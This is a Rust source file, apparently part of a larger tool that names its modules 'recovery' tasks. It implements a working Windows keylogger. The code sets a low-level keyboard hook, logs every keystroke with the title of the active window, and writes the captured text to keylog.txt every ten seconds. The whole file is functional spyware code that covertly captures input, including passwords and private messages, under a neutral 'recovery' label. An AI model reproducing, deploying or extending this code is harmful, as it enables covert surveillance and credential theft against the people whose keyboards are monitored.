use crate::recovery::context::RecoveryContext;
use crate::recovery::settings::RecoveryControl;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use once_cell::sync::Lazy;
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime};
use tokio::time::interval;
use tracing::error;
use windows::Win32::Foundation::{HMODULE, HWND, LPARAM, LRESULT, WPARAM};
use windows::Win32::UI::Input::KeyboardAndMouse::*;
use windows::Win32::UI::WindowsAndMessaging::*;

static KEY_LOG_BUFFER: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));
static LAST_WINDOW_TITLE: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));

pub struct KeyloggerTask;

#[async_trait]
impl RecoveryTask for KeyloggerTask {
    fn label(&self) -> String {
        "Keylogger".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        if !RecoveryControl::global().capture_clipboard() { 
             // Intentionally left blank or simple check
        }

        let log_file_path = ctx.output_dir.join("keylog.txt");
        let buffer = KEY_LOG_BUFFER.clone();
        
        std::thread::spawn(move || {
            install_hook();
        });

        let flush_path = log_file_path.clone();
        let flush_buffer = buffer.clone();
        
        tokio::spawn(async move {
            let mut interval = interval(Duration::from_secs(10));
            loop {
                interval.tick().await;
                let mut content = String::new();
                {
                    let mut lock = flush_buffer.lock().unwrap();
                    if !lock.is_empty() {
                        content = lock.clone();
                        lock.clear();
                    }
                }

                if !content.is_empty() {
                    use tokio::io::AsyncWriteExt;
                    let file = tokio::fs::OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open(&flush_path)
                        .await;
                    
                    if let Ok(mut f) = file {
                        let _ = f.write_all(content.as_bytes()).await;
                    }
                }
            }
        });
        
        Ok(vec![RecoveryArtifact {
            label: "Keylog".to_string(),
            path: log_file_path,
            size_bytes: 0,
            modified: Some(SystemTime::now()),
        }])
    }
}

fn install_hook() {
    unsafe {
        let hook_result = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            HMODULE::default(),
            0,
        );

        let hook_id = match hook_result {
            Ok(h) => h,
            Err(e) => {
                error!("failed to install keyboard hook: {}", e);
                return;
            }
        };

        if hook_id.is_invalid() {
            error!("failed to install keyboard hook (invalid handle)");
            return;
        }

        let mut msg = MSG::default();
        while GetMessageW(&mut msg, HWND::default(), 0, 0).as_bool() {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        
        let _ = UnhookWindowsHookEx(hook_id);
    }
}

unsafe extern "system" fn hook_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && wparam.0 == WM_KEYDOWN as usize {
        // Safe dereference in unsafe block
        let kbd_struct = unsafe { *(lparam.0 as *const KBDLLHOOKSTRUCT) };
        let vk_code = kbd_struct.vkCode;
        
        let window_title = get_foreground_window_title();
        let mut last_title = LAST_WINDOW_TITLE.lock().unwrap();
        
        let mut log_entry = String::new();
        
        if *last_title != window_title {
            log_entry.push_str(&format!("\n\n[{}]\n", window_title));
            *last_title = window_title;
        }

        let key_str = map_key(vk_code);
        log_entry.push_str(&key_str);

        let mut buffer = KEY_LOG_BUFFER.lock().unwrap();
        buffer.push_str(&log_entry);
    }

    unsafe { CallNextHookEx(HHOOK::default(), code, wparam, lparam) }
}

fn get_foreground_window_title() -> String {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.0 == 0 {
            return "Unknown".to_string();
        }
        
        let len = GetWindowTextLengthW(hwnd);
        if len == 0 {
            return "Unknown".to_string();
        }

        let mut buf = vec![0u16; (len + 1) as usize];
        GetWindowTextW(hwnd, &mut buf);
        
        String::from_utf16_lossy(&buf[..len as usize])
    }
}

fn map_key(vk: u32) -> String {
    match vk {
        0x08 => "[BACKSPACE]".to_string(),
        0x0D => "\n".to_string(),
        0x20 => " ".to_string(),
        0x09 => "[TAB]".to_string(),
        0x10 | 0xA0 | 0xA1 => "".to_string(), 
        0x11 | 0xA2 | 0xA3 => "[CTRL]".to_string(),
        0x12 | 0xA4 | 0xA5 => "[ALT]".to_string(),
        0x1B => "[ESC]".to_string(),
        vk => {
            unsafe {
                let mut buf = [0u16; 16];
                let mut state = [0u8; 256];
                let _ = GetKeyboardState(&mut state);
                
                let scan_code = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
                let result = ToUnicode(vk, scan_code, Some(&state), &mut buf, 0);
                
                if result > 0 {
                    String::from_utf16_lossy(&buf[..result as usize])
                } else {
                    format!("[0x{:X}]", vk)
                }
            }
        }
    }
}
